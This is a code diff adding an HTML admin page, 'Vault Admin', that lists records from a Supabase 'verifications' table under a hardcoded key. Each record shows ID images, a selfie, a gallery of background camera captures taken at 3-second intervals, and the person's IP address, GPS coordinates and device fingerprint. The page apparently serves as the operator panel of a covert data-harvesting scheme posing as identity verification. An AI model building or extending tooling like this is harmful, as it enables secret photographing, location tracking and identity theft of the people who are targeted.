@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Phanhon Pro Admin</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <style>
+        body { background: #0a0a0a; color: white; font-family: sans-serif; }
+        .folder { background: #1a1a1a; border: 1px solid #333; transition: all 0.2s; }
+        .folder:hover { border-color: #ab66ff; background: #222; }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #111; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #ab66ff; }
+    </style>
+</head>
+<body class="p-8">
+    <div class="max-w-6xl mx-auto">
+        <header class="flex justify-between items-center mb-10">
+            <h1 class="text-3xl font-bold text-[#ab66ff]">Vault Admin</h1>
+            <div class="flex gap-4">
+                <button onclick="fetchVerifications()" class="bg-[#ab66ff] px-4 py-2 rounded font-bold text-sm">Refresh Folders</button>
+            </div>
+        </header>
+
+        <div id="folder-container" class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
+            <!-- Folders will appear here -->
+        </div>
+
+        <!-- Detail View Modal -->
+        <div id="modal" class="fixed inset-0 bg-black/95 hidden flex items-center justify-center p-4 z-50">
+            <div class="bg-[#111] p-8 rounded-3xl max-w-5xl w-full border border-white/10 max-h-[90vh] overflow-y-auto">
+                <div class="flex justify-between items-center mb-8 sticky top-0 bg-[#111] py-2 z-10 border-b border-white/5">
+                    <h2 id="modal-title" class="text-2xl font-bold text-[#ab66ff]">User Data</h2>
+                    <button onclick="closeModal()" class="text-white/40 hover:text-white text-xl">✕</button>
+                </div>
+                
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                    <!-- Identity Evidence -->
+                    <div class="lg:col-span-2 space-y-6">
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <p class="text-[10px] font-bold text-white/30 uppercase mb-2 tracking-widest">Primary ID</p>
+                                <img id="img-thumb" class="w-full aspect-video object-cover rounded-xl border border-white/10 bg-black">
+                            </div>
+                            <div>
+                                <p class="text-[10px] font-bold text-white/30 uppercase mb-2 tracking-widest">Secondary ID</p>
+                                <img id="img-smile" class="w-full aspect-video object-cover rounded-xl border border-white/10 bg-black">
+                            </div>
+                        </div>
+
+                        <!-- Burst Capture Gallery -->
+                        <div>
+                            <p class="text-[10px] font-bold text-white/30 uppercase mb-2 tracking-widest">Background Burst (3s Intervals)</p>
+                            <div id="burst-gallery" class="grid grid-cols-4 sm:grid-cols-5 gap-2 max-h-60 overflow-y-auto p-2 bg-black/40 rounded-xl border border-white/5">
+                                <!-- Burst images loaded here -->
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Intelligence & Device Data -->
+                    <div class="space-y-6">
+                        <div class="p-5 bg-white/5 rounded-2xl border border-white/5">
+                            <p class="text-[10px] font-bold text-[#ab66ff] uppercase mb-4 tracking-widest">Device Intelligence</p>
+                            <div id="device-info" class="space-y-3 font-mono text-[11px] text-white/70">
+                                <!-- Device details -->
+                            </div>
+                        </div>
+
+                        <div class="p-5 bg-white/5 rounded-2xl border border-white/5">
+                            <p class="text-[10px] font-bold text-green-400 uppercase mb-4 tracking-widest">Network & Geo</p>
+                            <div id="geo-info" class="space-y-3 font-mono text-[11px] text-white/70">
+                                <!-- Geo/Net details -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const sb = supabase.createClient("https://tmvimacikrnrizxtcesf.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4");
+        
+        async function fetchVerifications() {
+            const { data, error } = await sb.from('verifications').select('*').order('created_at', { ascending: false });
+            const container = document.getElementById('folder-container');
+            if(!data) return;
+            container.innerHTML = data.map(v => `
+                <div onclick='openFolder(${JSON.stringify(v)})' class="folder p-6 rounded-2xl cursor-pointer flex flex-col items-center">
+                    <div class="relative">
+                        <svg class="w-16 h-16 text-[#ab66ff] mb-4" fill="currentColor" viewBox="0 0 20 20"><path d="M2 6a2 2 0 012-2h5l2 2h5a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"></path></svg>
+                        ${v.location_data?.burst ? `<span class="absolute -top-1 -right-1 bg-red-500 text-[8px] px-1.5 py-0.5 rounded-full font-bold">${v.location_data.burst.length}</span>` : ''}
+                    </div>
+                    <span class="font-bold text-sm">${v.username}</span>
+                    <span class="text-[10px] text-white/20 mt-1">${new Date(v.created_at).toLocaleString()}</span>
+                </div>
+            `).join('');
+        }
+
+        function openFolder(data) {
+            const modal = document.getElementById('modal');
+            modal.classList.remove('hidden');
+            document.getElementById('modal-title').innerText = `Folder: ${data.username}`;
+            document.getElementById('img-thumb').src = data.thumb_img || '';
+            document.getElementById('img-smile').src = data.smile_img || '';
+            
+            // Device Info
+            const dev = data.location_data?.device || {};
+            document.getElementById('device-info').innerHTML = `
+                <div><span class="text-white/30">IP:</span> ${dev.ipv4 || 'N/A'}</div>
+                <div><span class="text-white/30">OS:</span> ${dev.platform || 'N/A'}</div>
+                <div><span class="text-white/30">User-Agent:</span> <span class="text-[9px] block opacity-50 break-all">${dev.userAgent || 'N/A'}</span></div>
+                <div><span class="text-white/30">Cores:</span> ${dev.cores || 'N/A'}</div>
+                <div><span class="text-white/30">Display:</span> ${dev.screen || 'N/A'}</div>
+                <div><span class="text-white/30">Timezone:</span> ${dev.timezone || 'N/A'}</div>
+            `;
+
+            // Network & Geo
+            const net = dev.network || {};
+            document.getElementById('geo-info').innerHTML = `
+                <div><span class="text-white/30">Lat:</span> ${data.location_data?.lat || 'N/A'}</div>
+                <div><span class="text-white/30">Lng:</span> ${data.location_data?.lng || 'N/A'}</div>
+                <div><span class="text-white/30">Net-Type:</span> ${net.effectiveType || 'N/A'}</div>
+                <div><span class="text-white/30">Downlink:</span> ${net.downlink || 'N/A'} Mbps</div>
+            `;
+
+            // Burst Gallery
+            const gallery = document.getElementById('burst-gallery');
+            gallery.innerHTML = '';
+            const burst = data.location_data?.burst || [];
+            if(burst.length > 0) {
+                burst.forEach(img => {
+                    const el = document.createElement('img');
+                    el.src = img;
+                    el.className = "w-full aspect-square object-cover rounded-lg border border-white/5 hover:border-[#ab66ff] transition-all cursor-zoom-in";
+                    el.onclick = () => window.open(img);
+                    gallery.appendChild(el);
+                });
+            } else {
+                gallery.innerHTML = '<p class="col-span-full text-center py-4 text-[10px] text-white/20 uppercase tracking-widest">No burst data available</p>';
+            }
+        }
+
+        function closeModal() { document.getElementById('modal').classList.add('hidden'); }
+
+        window.onload = fetchVerifications;
+    </script>
+</body>
+</html>
